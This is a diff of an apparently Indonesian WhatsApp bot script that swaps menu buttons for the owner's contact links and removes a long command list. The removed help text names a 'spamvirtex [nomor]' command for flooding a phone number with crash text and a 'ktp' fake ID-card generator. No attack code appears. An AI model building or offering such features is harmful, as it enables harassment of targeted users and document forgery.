-𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${runtime(process.uptime())}
-𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : ${global.botnma}
-𝗢𝘄𝗻𝗲𝗿 𝗡𝗮𝗺𝗲 : ${global.ownernma}
-𝗢𝘄𝗻𝗲𝗿 𝗡𝘂𝗺𝗯𝗲𝗿 : ${global.owner}
-𝗛𝗼𝘀𝘁 𝗡𝗮𝗺𝗲 : ${os.hostname()}
-𝗣𝗹𝗮𝘁𝗳𝗼𝗿𝗺 : ${os.platform()}
+Instagram : @ini.lleo
+Wa Jasa Post : wa.me/62895-3373-1687-9
+Wa Rekber : wa.me/62858-9693-2340
 
 `
   let message = await prepareWAMessageMedia({ video: global.vidmenu1, gifPlayback: true }, { upload: XeonBotInc.waUploadToServer })
@@ -5573,33 +4547,33 @@ How Are You? 😊
          hydratedTemplate: {
            videoMessage: message.videoMessage,
            hydratedContentText: anu,
-           hydratedFooterText: `Button tidak muncul?, ketik ${prefix}allmenu untuk menampilkan semua fitur BOT\n\n© ${global.botnma}`,
+           hydratedFooterText: `PLEASE SELECT THE BUTTON BELOW\n© ${global.botnma}`,
                             hydratedButtons: [{
                                 urlButton: {
-                                    displayText: `${global.medsos1}`,
-                                    url: `${global.medsos1url}`
+                                    displayText: `WA Jasa Post`,
+                                    url: `https://wa.me/+62895337316879`
                                 }
                             }, {
                             	urlButton: {
-                                displayText: `${global.medsos2}`,
-                                    url: `${global.medsos2url}`
+                                displayText: `WA Rekber`,
+                                    url: `https://wa.me/62858-9693-2340`
+                                }
+                            }, {
+                                urlButton: {
+                                displayText: `Instagram`,
+                                    url: `https://instagram.com/ini.lleo?igshid=YmMyMTA2M2Y=`
+                                }
+                                }, {
+                                callButton: {
+                                    displayText: 'Owner Number👤',
+                                    phoneNumber: `62895337316879`
                                 }
                             }, {
                                 quickReplyButton: {
-                                    displayText: '𝗔𝗹𝗹 𝗠𝗲𝗻𝘂',
-                                    id: `${prefix}allmenu`
-                                }
-                                }, {
-                                quickReplyButton: {
-                                    displayText: '𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂',
-                                    id: `${prefix}command`
-                                }
-                                }, {
-                                quickReplyButton: {
-                                    displayText: '𝗛𝗢𝗪❓',
-                                    id: `${prefix}how`
-                                }
-                            }]
+                                    displayText: 'OWNER',
+                                    id: `${prefix}7owner`
+                                    }
+}]
                         }
                     }
                 }), { userJid: m.chat })
@@ -5608,2556 +4582,6 @@ How Are You? 😊
 break
 
             
-case 'command': case 'listmenu': case 'menulist':{
-	const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
-let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-                listMessage :{
-                    title: `Hi ${pushname}`,
-                    description: `Please Choose The Menu\n`,
-                    buttonText: "Menu",
-                    footerText: `_${global.botnma}_\n${tanggal}`,
-                    listType: "SINGLE_SELECT",
-                    sections: [{
-								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
-								"rows": [
-								   {
-										"title": "ABOUT THIS BOT",
-										"rowId": `${prefix}aboutbot`
-									},
-									{
-										"title": "SEWA BOT",
-										"rowId": `${prefix}sewabot`
-									},
-									{
-										"title": "PING",
-										"rowId": `${prefix}ping`
-									},
-									{
-										"title": "Term of Service",
-										"rowId": `${prefix}tosbot`
-									},
-									{
-										"title": "OWNER THIS BOT",
-										"rowId": `${prefix}owner`
-									}
-								]
-							},
-							{
-								"title": "🇬​🇷​🇴​🇺​🇵​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-								   {
-										"title": "[👮‍♂️] Admin Group Menu",
-										"description": "Fitur khusus admin group",
-                                         "rowId": `${prefix}admingroupmenu`
-									},
-									{
-										"title": "[⚙️] Group System Menu",
-										"description": "Sistem & Setting Group-Fitur khusus admin group",
-										"rowId": `${prefix}groupset`
-									},
-									{
-										"title": "[👨‍👩‍👧‍👦] Group Menu",
-										"description": "Fitur untuk semua, di group",
-										"rowId": `${prefix}groupmenu`
-									}
-								]
-							},
-							{
-								"title": "🇧​🇴​🇹​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-									{
-										"title": "[📑] All Menu",
-										"description": "Menampilkan semua fitur bot!",
-										"rowId": `${prefix}allmenu`
-									},
-									{
-										"title": "[ 🗿] Anime & Manga Menu",
-										"description": "Menampilkan menu anime & manga",
-										"rowId": `${prefix}animemenu`
-									},
-									{
-										"title": "[♻️] Convert Menu",
-										"description": "Fitur convert file dan media",
-										"rowId": `${prefix}convertmenu`
-									},
-										{
-											"title": "[🖼] Creator Maker Menu",
-										"description": "Menggabungkan foto dan teks",
-										"rowId": `${prefix}creatormakermenu`
-										},
-										{
-											"title": "[📂] Database & Chat Menu [💬]",
-										"description": "Menu database dan chat bot",
-										"rowId": `${prefix}databasemenu`
-										},
-										{
-											"title": "[📥] Downloader Menu",
-										"description": "Menu download media online",
-										"rowId": `${prefix}downloadmenu`
-										},
-										{
-										"title": "[ℹ️] Game Checker",
-										"description": "Alat pengecek PlayerID Game",
-										"rowId": `${prefix}gamechecker`
-										},
-										{
-											"title": "[🎮] Game Menu",
-										"description": "Game seru dan asik di sela waktu senggang ",
-										"rowId": `${prefix}gamemenu`
-										},
-										{
-											"title": "[📚] Informasi Menu",
-										"description": "Cari informasi apa saja di menu ini",
-										"rowId": `${prefix}infomenu`
-										},
-										{
-										"title": "[﷽] Islami Menu",
-										"description": "Menu Islami | Al-Qur'an, Sholat, Kisah Nabi, dll",
-										"rowId": `${prefix}islammenu`
-										},
-										{
-											"title": "[🌚] Meme Menu",
-										"description": "Random foto meme kocak",
-										"rowId": `${prefix}mememenu`
-										},
-										{
-											"title": "[🌝] Meme Maker Menu",
-										"description": "Editor pembuat meme",
-										"rowId": `${prefix}mememakermenu`
-										},
-										{
-											"title": "[📰] News Berita Menu",
-										"description": "Berita aktual dalam dan luar negeri",
-										"rowId": `${prefix}beritamenu`
-										},
-										{
-										"title": "[🎇] Photo Editor",
-										"description": "Foto editor dan efek foto!",
-										"rowId": `${prefix}photoeditormenu`
-									},
-									{
-										"title": "[💝] Primbon Menu",
-										"description": "Menu primbon lengkap",
-										"rowId": `${prefix}primbonmenu`
-									},
-									{
-										"title": "[📄] Quotes Menu",
-										"description": "Menu quotes dan kata bijak",
-										"rowId": `${prefix}quotesmenu`
-									},
-									{
-										"title": "[📝] Quotes Maker Menu",
-										"description": "Editor foto | Quotes maker",
-										"rowId": `${prefix}quotesmakermenu`
-									},
-										{
-											"title": "[🌌] Random Image",
-										"description": "Random berbagai foto",
-										"rowId": `${prefix}randomimage`
-										},
-										{
-											"title": "[📋] Random Teks",
-										"description": "Random berbagai teks",
-										"rowId": `${prefix}randomteks`
-										},
-										{
-											"title": "[🔎] Search Menu",
-										"description": "Menu pencarian | Cari apa saja dengan menu ini",
-										"rowId": `${prefix}searchmenu`
-										},
-										{
-										"title": "[🏫] Sekolah Menu",
-										"description": "Menu pendukung kebutuhan belajar",
-										"rowId": `${prefix}sekolahmenu`
-										},
-										{
-											"title": "[🏆] Sertifikat Menu ",
-										"description": "Buat berbagai sertifikat mudah dengan nama mu ",
-										"rowId": `${prefix}sertifikatmenu`
-										},
-										{
-											"title": "[🔭] Stalk Menu",
-										"description": "Menampilkan user profil IG, Tiktok, Github, dll",
-										"rowId": `${prefix}stalkmenu`
-										},
-										{
-										"title": "[🫥] Sticker Menu",
-										"description": "Buat dan Edit Sticker WhatsApp sesukamu",
-										"rowId": `${prefix}stickermenu`
-										},
-										{
-											"title": "[🌠] Teks Maker",
-										"description": "Buat teks menjadi foto, dengan pilihan gaya yang banyak",
-										"rowId": `${prefix}teksmaker`
-										},
-										{
-											"title": "[🌐] Tools & Internet Menu",
-										"description": "Alat yang membantu mu, untuk memudahkan dalam dunia internet",
-										"rowId": `${prefix}toolsmenu`
-										},
-									 {
-											"title": "[🎵] Voice Changer Menu",
-										"description": "Alat untuk merubah suara",
-										"rowId": `${prefix}voicechanger`
-										}
-								]
-							},
-							{
-								"title": "🇧​🇪​🇹​🇦​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-									{
-										"title": "[💭] Anonymous Chat Menu",
-										"description": "Ngobrol dengan sesama pengguna",
-										"rowId": `${prefix}anonymouschatmenu`
-									},
-									{
-										"title": "[📧] Email Sementara",
-										"description": "Dapatkan Email sementara dan kelola sesuka Kamu",
-										"rowId": `${prefix}emailmenu`
-									}
-								]
-							},
-							{
-								"title": "🇴​🇼​🇳​🇪​🇷​ 🇫​🇪​🇦​🇹​🇺​🇷​🇪​🇸​",
-								"rows": [
-									{
-										"title": "[🤴] Owner Menu",
-										"description": "Fitur khusus owner bot",
-										"rowId": `${prefix}ownermenu`
-									}
-								]
-							},
-							{
-								"title": "🤖🇧​🇴​🇹​ 🇮​🇳​🇫​🇴​🇷​🇲​🇦​🇹​🇮​🇴​🇳​🤖",
-								"rows": [
-								  {
-										"title": "ABOUT DEVELOPERS",
-									
-										"rowId": `${prefix}aboutdev`
-									},
-									{
-										"title": "DONASI",
-									
-										"rowId": `${prefix}donasi`
-									},
-									{
-										"title": "BOT SCRIPT",
-									
-										"rowId": `${prefix}script`
-									},
-									{
-										"title": "THANKS TO",
-									
-										"rowId": `${prefix}tqto`
-									},
-									{
-										"title": "REPORT BUG",
-									
-										"rowId": `${prefix}report`
-									}
-								]
-							}
-						],
-          listType: 1
-                }
-            }), {})
-            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
-            }
-            break
-            case 'allmenu': case 'menuall': case 'semuamenu': case 'allfitur': case 'fiturall': case 'semuafitur': {
-            	reply(`━━━━━ 𝗔𝗟𝗟 𝗠𝗘𝗡𝗨 ━━━━━
-
-*✧ Owner Menu ✧*
-  ➙ ${prefix}self 
-  ➙ ${prefix}bc [teks]
-  ➙ ${prefix}bcgc [teks]
-  ➙ ${prefix}setbotpp _Reply image_
-  ➙ ${prefix}join [link gc wa]
-  ➙ ${prefix}out _in group chat_
-  ➙ ${prefix}block [nomor]
-  ➙ ${prefix}unblock [nomor]
-  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
-  ➙ ${prefix}okvirtex 
-  ➙ ${prefix}spamvirtex [nomor] 
-  ➙ =>
-  ➙ >
-  ➙ $
-  
-*✧ Admin Group Menu ✧*
-  ➙ ${prefix}add [nomor]
-  ➙ ${prefix}kick @user
-  ➙ ${prefix}groupset
-  ➙ ${prefix}tagall
-  ➙ ${prefix}hidetag [teks]
-  ➙ ${prefix}setname [teks]
-  ➙ ${prefix}setdesk [teks]
-  ➙ ${prefix}setppgc _Reply image_
-  ➙ ${prefix}promote @user
-  ➙ ${prefix}demote @user
-
-*✧ Group System & Setting ✧*
-  ➙ ${prefix}groupset
-
-*✧ Group Menu ✧*
-  ➙ ${prefix}hidetag [teks]
-  ➙ ${prefix}grupinfo 
-  ➙ ${prefix}linkgroup
-  ➙ ${prefix}listonline 
-  ➙ ${prefix}vote
-  ➙ ${prefix}couple
-  ➙ ${prefix}pasanganku
-  ➙ ${prefix}add [nomor]
-  ➙ ${prefix}del _Reply pesan bot_ 
-  ➙ ${prefix}chatinfo _Reply pesan bot_ 
-  ➙ ${prefix}quoted _Reply pesan contain reply_ 
-  
-*✧ Anime & Manga Menu ✧*
-  ➙ ${prefix}animesearch [query]
-  ➙ ${prefix}mangasearch [query]
-  ➙ ${prefix}character [query]
-  ➙ ${prefix}kusonimes [query]
-  ➙ ${prefix}storyanime
-  ➙ ${prefix}neonime
-
-*✧ Convert Menu ✧*
-  ➙ ${prefix}sticker _Reply image/video_
-  ➙ ${prefix}toimg _Reply sticker_
-  ➙ ${prefix}tovideo _Reply sticker_
-  ➙ ${prefix}togif _Reply sticker_
-  ➙ ${prefix}toaudio _Reply video_
-  ➙ ${prefix}tomp3 _Reply video_
-  ➙ ${prefix}tovn _Reply video/audio_
-  ➙ ${prefix}tourl _Reply Foto/Video/Dokumen_
-  ➙ ${prefix}imagenobg _Reply Image/foto_
-  ➙ ${prefix}topdf _Reply Foto/dokumen_
-  ➙ ${prefix}emojimix [emoji1+emoji2]
-  ➙ ${prefix}tobinary _Reply pesan teks_
-  ➙ ${prefix}dbinary _Reply pesan kode binary_
-  ➙ ${prefix}tohex [teks]
-  ➙ ${prefix}dhex [kode hex]
-  ➙ ${prefix}tomorse [teks]
-  ➙ ${prefix}dmorse [kode morse]
-  ➙ ${prefix}style [teks]
-
-*✧ Creator Maker Menu ✧*
-  ➙ ${prefix}gsuggest [teks1+teks2+teks3]
-  
-  ➙ ${prefix}ytkomen [username+comment] _Reply image_
-  
-  ➙ ${prefix}phkomen [username+comment] _Reply image_
-  
-  ➙ ${prefix}yugioh [title+deskripsi+atk+def] _Reply image_
-  
-  ➙ ${prefix}ktp [Nik+Provinsi+Kabupaten+Nama+tempat tanggal lahir+Jenis kelamin+Jalan+Rt/Rw+Desa+Kecamatan+Agama+Status kawin+Pekerjaan+Warga Negara+Berlaku hingga] _Reply image_
- 
-  ➙ ${prefix}amongus [teks]
-  ➙ ${prefix}idulfitri [teks]
-  ➙ ${prefix}ramadhan [teks]
-  ➙ ${prefix}twtrump [teks]
- 
- 
-*✧ Database & Chat Menu ✧*
-  ➙ ${prefix}delete _Reply message bot_
-  ➙ ${prefix}del _Reply message bot_
-  ➙ ${prefix}afk [alasan]
-  ➙ ${prefix}setcmd [${prefix}command nya] _Reply sticker/image_
-  ➙ ${prefix}listcmd
-  ➙ ${prefix}delcmd _Reply sticker/image key cmd_
-  ➙ ${prefix}lockcmd _Reply sticker/image key cmd_
-  ➙ ${prefix}listpc
-  ➙ ${prefix}listgc
-  ➙ ${prefix}addmsg [teks] _Reply message_
-  ➙ ${prefix}getmsg [key msg] 
-  ➙ ${prefix}listmsg
-  ➙ ${prefix}delmsg [key msg]
-  
-*✧ Downloader Menu ✧*
-  ➙ ${prefix}play [query]
-  ➙ ${prefix}ytmp4 [url]
-  ➙ ${prefix}ytmp3 [url]
-  ➙ ${prefix}tiktok [url]
-  ➙ ${prefix}tiktokmp3 [url]
-  ➙ ${prefix}igtv [url]
-  ➙ ${prefix}igreels [url]
-  ➙ ${prefix}twittervideo [url]
-  ➙ ${prefix}twitterfoto [url]
-  ➙ ${prefix}getvideo [nomor list yts]
-  ➙ ${prefix}getmusic [nomor list yts]
-  ➙ ${prefix}ringtone [query]
-  ➙ ${prefix}gimage [query]
-  ➙ ${prefix}pinterest [query]
-  ➙ ${prefix}wikimedia [query]
-  ➙ ${prefix}wallpaper [query]
-  ➙ ${prefix}mediafire [url]
-  ➙ ${prefix}sfilemobi [url]
-  
-*✧ Game Checker ✧*
-  ➙ ${prefix}ffcek [PlayerID]
-  ➙ ${prefix}mlbbcek [PlayerID ServerID]
-  ➙ ${prefix}pubgcek [PlayerID]
-  ➙ ${prefix}dominocek [UserID]
-  
-*✧ Game Menu ✧*
-  ➙ ${prefix}math
-  ➙ ${prefix}tebak lirik
-  ➙ ${prefix}tebak kata
-  ➙ ${prefix}tebak kalimat
-  ➙ ${prefix}tebak gambar
-  ➙ ${prefix}tebak lagu
-  ➙ ${prefix}tebak lontong
- 
-*✧ Informasi Menu ✧*
-  ➙ ${prefix}wikipedia [query]
-  ➙ ${prefix}kbbi [query]
-  ➙ ${prefix}cuaca [kota]
-  ➙ ${prefix}barinly [query]
-  ➙ ${prefix}chord [judul lagu]
-  ➙ ${prefix}beasiswa
-  ➙ ${prefix}jadwaltv
-  ➙ ${prefix}jadwalbola
-  ➙ ${prefix}infogempa
-  ➙ ${prefix}corona
-  ➙ ${prefix}coronaindo
-  ➙ ${prefix}jarak [kota1 kota2]
-  
-*✧ Islami Menu ✧*
-  ➙ ${prefix}listsurah
-  ➙ ${prefix}alquran
-  ➙ ${prefix}alquranmp3
-  ➙ ${prefix}surahmp3
-  ➙ ${prefix}ayatmp3
-  ➙ ${prefix}jadwalsholat [NamaKota]
-  ➙ ${prefix}hadits
-  ➙ ${prefix}niatsholat
-  ➙ ${prefix}quotesislami
-  ➙ ${prefix}asmaulhusna
-  ➙ ${prefix}kisahnabi
-  
-*✧ Meme Menu ✧*
-  ➙ ${prefix}darkjoke
-  ➙ ${prefix}memeindo
-  ➙ ${prefix}memeglobal
-
-*✧ Meme Maker Menu ✧*
-  ➙ ${prefix}meme1 [teks]
-  ➙ ${prefix}mem2 [teks1+teks2]
-  ➙ ${prefix}meme3 [teks1+teks2+teks3]
-  ➙ ${prefix}meme4 [teks]
-  ➙ ${prefix}meme5 [teks]
-  ➙ ${prefix}meme6 [teks1+teks2+teks3]
-  ➙ ${prefix}mem7 [teks1+teks2]
-  ➙ ${prefix}meme8 [teks1+teks2+teks3]
-  ➙ ${prefix}kanna [teks]
-  ➙ ${prefix}mind [teks]
-  ➙ ${prefix}ohno [teks]
-  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
-  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
-
-*✧ News Berita Menu ✧*
-  ➙ ${prefix}hoax
-  ➙ ${prefix}newsinfo
-  ➙ ${prefix}liputan6
-  ➙ ${prefix}republika
-  ➙ ${prefix}kumparan
-  ➙ ${prefix}detiknews
-  ➙ ${prefix}jalantikus
-  ➙ ${prefix}cnnindonesia
-  ➙ ${prefix}cnnnasional
-  ➙ ${prefix}cnninternasional
-  ➙ ${prefix}cnnolahraga
-  ➙ ${prefix}cnnteknologi
-  ➙ ${prefix}cnnhiburan
-  ➙ ${prefix}cnnsocial
-  
-*✧ Photo Editor ✧*
-  ➙ ${prefix}wasted _Reply Foto_ 
-  ➙ ${prefix}pencil _Reply Foto_ 
-  ➙ ${prefix}triggered _Reply Foto_
-  ➙ ${prefix}fisheye _Reply Foto_
-  ➙ ${prefix}skullmask _Reply Foto_
-  ➙ ${prefix}cartoon _Reply Foto_
-  ➙ ${prefix}invert _Reply Foto_
-  ➙ ${prefix}pixelate _Reply Foto_
-  ➙ ${prefix}flip _Reply Foto_
-  ➙ ${prefix}grayscale _Reply Foto_
-  ➙ ${prefix}roundimage _Reply Foto_
-  
-  ➙ ${prefix}affect _Reply Foto_
-  ➙ ${prefix}beautiful _Reply Foto_
-  ➙ ${prefix}facepalm _Reply Foto_
-  ➙ ${prefix}hitler _Reply Foto_
-  ➙ ${prefix}jail _Reply Foto_
-  ➙ ${prefix}jokeoverhead _Reply Foto_
-  ➙ ${prefix}rainbow _Reply Foto_
-  ➙ ${prefix}sepia _Reply Foto_
-  ➙ ${prefix}trash _Reply Foto_
-  ➙ ${prefix}wanted _Reply Foto_
-  
-  ➙ ${prefix}1977 _Reply Foto_
-  ➙ ${prefix}aden _Reply Foto_
-  ➙ ${prefix}brannan _Reply Foto_
-  ➙ ${prefix}brooklyn _Reply Foto_
-  ➙ ${prefix}gingham _Reply Foto_
-  ➙ ${prefix}hudson _Reply Foto_ 
-  ➙ ${prefix}inkwell _Reply Foto_
-  ➙ ${prefix}earlybird _Reply Foto_
-  ➙ ${prefix}kelvin _Reply Foto_
-  ➙ ${prefix}larlk _Reply Foto_
-  ➙ ${prefix}lofi _Reply Foto_
-  ➙ ${prefix}maven _Reply Foto_ 
-  ➙ ${prefix}mayfair _Reply Foto_
-  ➙ ${prefix}moon _Reply Foto_
-  ➙ ${prefix}perpetua _Reply Foto_
-  ➙ ${prefix}nashville _Reply Foto_
-  ➙ ${prefix}reyes _Reply Foto_
-  ➙ ${prefix}rise _Reply Foto_
-  ➙ ${prefix}slumber _Reply Foto_
-  ➙ ${prefix}stinson _Reply Foto_
-  ➙ ${prefix}toaster _Reply Foto_
-  ➙ ${prefix}valencia _Reply Foto_
-  ➙ ${prefix}walden _Reply Foto_
-  ➙ ${prefix}willow _Reply Foto_
-  ➙ ${prefix}gingham _Reply Foto_
-  ➙ ${prefix}xpro2 _Reply Foto_
-  
-  
-*✧ Primbon Menu ✧*
-  ➙ ${prefix}nomerhoki [nomor]
-  ➙ ${prefix}artimimpi [mimpi apa]
-  ➙ ${prefix}ramalanjodoh
-  ➙ ${prefix}ramalanjodohbali
-  ➙ ${prefix}suamiistri
-  ➙ ${prefix}ramalancinta
-  ➙ ${prefix}artinama [nama]
-  ➙ ${prefix}kecocokannama
-  ➙ ${prefix}kecocokanpasangan
-  ➙ ${prefix}jadianpernikahan
-  ➙ ${prefix}sifatusaha
-  ➙ ${prefix}rezeki
-  ➙ ${prefix}pekerjaan
-  ➙ ${prefix}ramalannasib
-  ➙ ${prefix}potensipenyakit
-  ➙ ${prefix}artitarot
-  ➙ ${prefix}fengshui
-  ➙ ${prefix}haribaik
-  ➙ ${prefix}harisangar
-  ➙ ${prefix}harisial
-  ➙ ${prefix}nagahari
-  ➙ ${prefix}arahrejeki
-  ➙ ${prefix}peruntungan
-  ➙ ${prefix}weton
-  ➙ ${prefix}karakter
-  ➙ ${prefix}keberuntungan
-  ➙ ${prefix}memancing
-  ➙ ${prefix}masasubur
-  ➙ ${prefix}zodiak
-  
-*✧ Quotes Menu ✧*
-  ➙ ${prefix}quotes
-  ➙ ${prefix}quotesislami
-  ➙ ${prefix}quotesanime
-  ➙ ${prefix}quotesdilan
-  ➙ ${prefix}katabijak [query]
-  ➙ ${prefix}katabucin
- 
-*✧ Quotes Maker Menu ✧*
-  ➙ ${prefix}qmaker [quotes]
-  ➙ ${prefix}qmaker2 [author+quotes]
-  ➙ ${prefix}qmaker3 [quotes] _Reply image_
-
-*✧ Random Image ✧*
-  ➙ ${prefix}rblackpink
-  ➙ ${prefix}bts
-  ➙ ${prefix}exo
-  ➙ ${prefix}cecan
-  ➙ ${prefix}cogan
-  ➙ ${prefix}estetic
-  ➙ ${prefix}elf
-  ➙ ${prefix}loli
-  ➙ ${prefix}neko
-  ➙ ${prefix}waifu
-  ➙ ${prefix}shota
-  ➙ ${prefix}husbu
-  ➙ ${prefix}sagiri
-  ➙ ${prefix}elaina
-  ➙ ${prefix}shinobu
-  ➙ ${prefix}kanna
-  ➙ ${prefix}megumin
-  ➙ ${prefix}art
-  ➙ ${prefix}wallnime
-  ➙ ${prefix}neko2
-  ➙ ${prefix},gif
-  ➙ ${prefix}feed
-  ➙ ${prefix}kiss
-  ➙ ${prefix}smug
-  ➙ ${prefix}tickle
-  ➙ ${prefix}cuddle
-  ➙ ${prefix}fox_girl
-  ➙ ${prefix}bully
-  ➙ ${prefix}cry
-  ➙ ${prefix}hug
-  ➙ ${prefix}awoo
-  ➙ ${prefix}lick
-  ➙ ${prefix}pat
-  ➙ ${prefix}bonk
-  ➙ ${prefix}yeet
-  ➙ ${prefix}blush
-  ➙ ${prefix}smile
-  ➙ ${prefix}wave
-  ➙ ${prefix}highfive
-  ➙ ${prefix}handhold
-  ➙ ${prefix}nom
-  ➙ ${prefix}bite
-  ➙ ${prefix}glomp
-  ➙ ${prefix}kill
-  ➙ ${prefix}slap
-  ➙ ${prefix}happy
-  ➙ ${prefix}wink
-  ➙ ${prefix}dance
-  ➙ ${prefix}cringe
-  ➙ ${prefix}gasm
-  
-*✧ Random Teks ✧*
-  ➙ ${prefix}faktaunik
-  ➙ ${prefix}quotes
-  ➙ ${prefix}quotesanime
-  ➙ ${prefix}quotesdilan
-  ➙ ${prefix}quotesislami
-  ➙ ${prefix}katabucin
-  ➙ ${prefix}cerpen
-  ➙ ${prefix}puisi
-  ➙ ${prefix}pantun
-  ➙ ${prefix}nasihat
-  ➙ ${prefix}ceritahoror
-  
-*✧ Search Menu ✧*
-  ➙ ${prefix}groupwa [query]
-  ➙ ${prefix}play [query]
-  ➙ ${prefix}ytsearch [query]
-  ➙ ${prefix}gimage [query]
-  ➙ ${prefix}gimage [query]
-  ➙ ${prefix}pinterest [query]
-  ➙ ${prefix}wikipedia [query]
-  ➙ ${prefix}wikimedia [query]
-  ➙ ${prefix}wallpaper [query]
-  ➙ ${prefix}unsplash [query]
-  ➙ ${prefix}pixiv [query]
-  ➙ ${prefix}ringtone [query]
-  ➙ ${prefix}katabijak [query]
-  ➙ ${prefix}barinly [query]
-  ➙ ${prefix}animesearch [query]
-  ➙ ${prefix}mangasearch [query]
-  ➙ ${prefix}character [query]
-  ➙ ${prefix}kusonimes [query]
-  ➙ ${prefix}chord [judul lagu]
-  
-*✧ Sekolah Menu ✧*
-  ➙ ${prefix}nulis [teks]
-  ➙ ${prefix}brainly [soal]
-  ➙ ${prefix}google [query]
-  ➙ ${prefix}translate [teks]
-  ➙ ${prefix}tst [teks]
-  ➙ ${prefix}ocr _Reply image_
-  ➙ ${prefix}tts [teks]
-  
-*✧ Sertifikat Menu ✧*
-  ➙ ${prefix}ytsilver [nama]
-  ➙ ${prefix}ytgold [nama]
-  ➙ ${prefix}tolol [nama]
-  ➙ ${prefix}bucin [nama]
-  ➙ ${prefix}fuckgirl [nama]
-  ➙ ${prefix}fuckboy [nama]
-  ➙ ${prefix}goodgirl [nama]
-  ➙ ${prefix}goodboy [nama]
-  ➙ ${prefix}badgirl [nama]
-  ➙ ${prefix}badboy [nama]
-  ➙ ${prefix}pacar [nama1 nama2]
-  
-*✧ Stalk Menu ✧*
-  ➙ ${prefix}igstalk [username]
-  ➙ ${prefix}tiktokstalk [username]
-  ➙ ${prefix}twitterstalk [username]
-  ➙ ${prefix}githubstalk [username]
-  ➙ ${prefix}youtubestalk [nama channel]
-  ➙ ${prefix}ipinfo [IP Address]
-  
-*✧ Sticker Menu ✧*
-  ➙ ${prefix}harta [teks]
-  ➙ ${prefix}hartacustom [teks]
-  ➙ ${prefix}sticker _reply image/video_
-  ➙ ${prefix}toimg _reply sticker_
-  ➙ ${prefix}tovideo _reply sticker_
-  ➙ ${prefix}togif _Reply sticker_
-  ➙ ${prefix}attp [teks]
-  ➙ ${prefix}attp2 [teks]
-  ➙ ${prefix}ttp [teks]
-  ➙ ${prefix}ttp2 [teks]
-  ➙ ${prefix}ttp3 [teks]
-  ➙ ${prefix}ttp4 [teks]
-  ➙ ${prefix}ttp5 [teks]
-  ➙ ${prefix}ttp6 [teks]
-  ➙ ${prefix}smeme [teks1+teks2] _Reply Image_
-  ➙ ${prefix}memecreator [teks1+teks2] _Reply Image_
-  ➙ ${prefix}emojimix [emoji1+emoji2]
-  ➙ ${prefix}patrick
-  ➙ ${prefix}samongus
-  ➙ ${prefix}gawrgura
-  
-*✧ Teks Maker ✧*
-     Top Maker
-  ➙ ${prefix}style [teks]
-  ➙ ${prefix}nulis [teks]
-  ➙ ${prefix}harta [teks]
-  ➙ ${prefix}hartacustom [teks]
-  ➙ ${prefix}qrcode [teks]
-  ➙ ${prefix}tiktokmaker [teks1 teks2]
-  ➙ ${prefix}pornhub [teks1 teks2]
-  ➙ ${prefix}pubg [teks1 teks2]
-  ➙ ${prefix}battlefield4 [teks1 teks2]
-  ➙ ${prefix}arcade8bit [teks1 teks2]
-     Ephoto 360 Maker
-  ➙ ${prefix}hologram3d [teks]
-  ➙ ${prefix}birthdaycake [teks]
-  ➙ ${prefix}lighttext [teks]
-  ➙ ${prefix}galaxywallpaper [teks]
-  ➙ ${prefix}luxurygold [teks]
-  ➙ ${prefix}activegalaxybat [teks]
-  ➙ ${prefix}textbyname [teks]
-  ➙ ${prefix}starsnight [teks]
-  ➙ ${prefix}aovwallpaper [teks]
-  ➙ ${prefix}pubgmaskot [teks]
-  ➙ ${prefix}mlwallpaper [teks]
-  ➙ ${prefix}anonymhacker [teks]
-  ➙ ${prefix}freefire [teks]
-  ➙ ${prefix}avatardota [teks]
-  ➙ ${prefix}avatarlolnew [teks]
-  ➙ ${prefix}logogaming [teks]
-     Photo Oxy Maker
-  ➙ ${prefix}smoke [teks]
-  ➙ ${prefix}romance [teks]
-  ➙ ${prefix}cup2 [teks]
-  ➙ ${prefix}shadow [teks]
-  ➙ ${prefix}sandwriting [teks]
-  ➙ ${prefix}coffe [teks]
-  ➙ ${prefix}love [teks]
-  ➙ ${prefix}undergrass [teks]
-  ➙ ${prefix}lovemessage [teks]
-  ➙ ${prefix}burnpaper [teks] 
-  ➙ ${prefix}nature3d [teks]
-  ➙ ${prefix}wolfmetal [teks]
-  ➙ ${prefix}summer3d [teks]
-  ➙ ${prefix}woodenboard [teks]
-  ➙ ${prefix}woodheart [teks]
-  ➙ ${prefix}flamming [teks]
-  ➙ ${prefix}fallleaves [teks]
-  ➙ ${prefix}summernature [teks]
-  ➙ ${prefix}goldenrose [teks]
-  ➙ ${prefix}underwater [teks]
-  ➙ ${prefix}carvedwood [teks]
-  ➙ ${prefix}harrypotter [teks]
-     Text Pro Maker
-  ➙ ${prefix}marvelstudio [teks1 teks2]
-  ➙ ${prefix}ninjalogo [teks1 teks2]
-  ➙ ${prefix}space [teks1 teks2]
-  ➙ ${prefix}avenger [teks1 teks2]
-  ➙ ${prefix}glitch [teks1 teks2]
-  ➙ ${prefix}coolgravity [teks1 teks2]
-  ➙ ${prefix}wallgravity [teks1 teks2]
-  ➙ ${prefix}wolflogo [teks1 teks2]
-  ➙ ${prefix}lionlogo [teks1 teks2]
-  ➙ ${prefix}marvelstudio [teks1 teks2]
-  ➙ ${prefix}blackpink [teks]
-  ➙ ${prefix}neon [teks]
-  ➙ ${prefix}greenneon [teks]
-  ➙ ${prefix}futureneon [teks]
-  ➙ ${prefix}sandwriting [teks]
-  ➙ ${prefix}sandsummer [teks]
-  ➙ ${prefix}sandengraved [teks]
-  ➙ ${prefix}text1917 [teks]
-  ➙ ${prefix}holographic [teks]
-  ➙ ${prefix}neonlight [teks]
-  ➙ ${prefix}metaldark [teks]
-  ➙ ${prefix}halloween [teks]
-  ➙ ${prefix}bloodfrosted [teks]
-  ➙ ${prefix}newyearcard [teks]
